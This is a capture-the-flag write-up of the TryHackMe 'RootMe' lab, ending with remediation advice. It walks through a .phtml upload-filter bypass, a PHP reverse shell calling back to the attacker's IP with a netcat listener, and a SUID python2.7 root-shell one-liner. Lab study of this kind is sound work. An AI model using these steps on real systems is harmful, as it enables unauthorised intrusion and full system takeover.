# TryHackMe — RootMe

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu 20.04) |
| **Date** | 2026-11-23 |
| **Skills** | Port scanning, web directory enumeration, file upload filter bypass, PHP reverse shell, SUID privilege escalation |

> Flags are redacted, following TryHackMe's write-up guidelines.

## Summary

A PHP web application has a hidden upload panel that blocks `.php` files by extension only. Uploading a PHP reverse shell as **`.phtml`** gets past the filter, and Apache still runs it as PHP, which gives a shell as `www-data`. **`/usr/bin/python2.7` has the SUID bit set and is owned by root**, so a single Python one-liner spawns a root shell.

## 1. Reconnaissance

```bash
sudo nmap -p- --min-rate 1000 -T4 -oN ports.txt <TARGET>
```

Only two ports are open: **22** and **80**. Running nmap with `sudo` makes it use a SYN scan (`-sS`), which is faster and quieter than the full TCP connect scan (`-sT`) it falls back to without root.

```bash
nmap -sV -sC -p 22,80 -oN services.txt <TARGET>
```

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 8.2p1 (Ubuntu) | No credentials yet |
| 80 | Apache 2.4.41 (Ubuntu) | Title "HackIT - Home"; `PHPSESSID` cookie set without the `HttpOnly` flag |

The `PHPSESSID` cookie gives away that the site runs on **PHP**. That shapes both the enumeration and the payload.

## 2. Web enumeration

Since the site is PHP, gobuster also tries every word with a `.php` extension (`-x php`):

```bash
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php -o web.txt
```

```
/css      (301)
/index.php (200)
/js       (301)
/panel    (301)
/uploads  (301)
```

The two interesting results work as a pair. **`/panel/`** has a file upload form, and **`/uploads/`** is where the uploaded files are stored and can be browsed. That means anything uploaded can then be requested, and run, by the web server.

## 3. Initial access — upload filter bypass

The payload is the PHP reverse shell that ships with Kali, with my VPN (`tun0`) IP and a listening port filled in:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# edit: $ip = '<MY_TUN0_IP>'; $port = 3333;
```

The panel rejects `shell.php`. The filter only checks the **file extension**, and `.php` is blocklisted. Renaming the file to `.png` would get it uploaded, but Apache would serve it as an image and never run the code. What's needed is an extension the filter doesn't block but Apache still hands to PHP. **`.phtml`** fits:

```bash
cp shell.php shell.phtml
```

`shell.phtml` uploads fine. Start the listener **first**, then request the file:

```bash
nc -lvnp 3333
```

```
http://<TARGET>/uploads/shell.phtml
```

```
connect to [<MY_TUN0_IP>] from (UNKNOWN) [<TARGET>] 44788
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

Upgrade to a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The user flag isn't in a home directory, so search the whole filesystem and hide the permission errors (`2>/dev/null` sends stderr to the void):

```bash
find / -name user.txt 2>/dev/null
# /var/www/user.txt
```

## 4. Privilege escalation — SUID python2.7

List the binaries with the SUID bit set. These run with their **owner's** privileges, not the caller's:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Most of the results are expected (`passwd`, `su`, `sudo`, `mount`, `pkexec`, the snap copies). One isn't: **`/usr/bin/python2.7`**. An interpreter running as root will execute any code you give it as root.

GTFOBins (*python → Shell → SUID*):

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami   # root
```

The **`-p`** flag matters. When `sh` notices that its effective UID differs from its real UID, as it does under SUID, it drops the extra privileges by default. `-p` tells it to keep them. Without it you'd get a shell back as `www-data`.

The root flag is in `/root/root.txt`.

## Attack chain

```
nmap → PHP site on :80
     → gobuster -x php → /panel (upload) + /uploads (storage)
     → .php blocked → .phtml bypass → PHP reverse shell → www-data
     → find SUID → /usr/bin/python2.7 → os.execl sh -p → root
```

## Root causes and remediation

| Issue | Fix |
|---|---|
| Upload filter uses an extension blocklist | Allowlist the permitted types (for example images only), check the content, rename uploaded files, and store them outside the web root or in a directory where PHP doesn't run |
| PHP runs inside `/uploads` | Disable script execution in the upload directory (Apache `php_admin_flag engine off` or a `<FilesMatch>` deny) |
| SUID bit on a Python interpreter | Never set SUID on interpreters; audit regularly with `find / -perm -4000` |
| `PHPSESSID` without `HttpOnly` | Set `session.cookie_httponly = 1` so JavaScript can't steal session cookies through XSS |

## Lessons learned

- **The PHP cookie gave away the stack.** Spotting `PHPSESSID` led to `gobuster -x php` and to choosing a PHP payload.
- **Upload form ≠ upload folder.** `/uploads` is where files end up; `/panel` is where you send them.
- **Blocklists fail.** `.phtml`, `.php5` and others are valid PHP extensions that a `.php` blocklist doesn't catch.
- **Listener first, trigger second.** If nothing is listening when the shell connects back, it just exits.
- **Tooling gotcha:** with `rlwrap nc` my keystrokes didn't reach this shell, while plain `nc -lvnp` worked fine. To leave a netcat shell, close the tab instead of pressing Ctrl+C, which can kill the session.
- **SUID + `sh -p`.** It's worth knowing why `-p` is needed, not just copying it from GTFOBins.
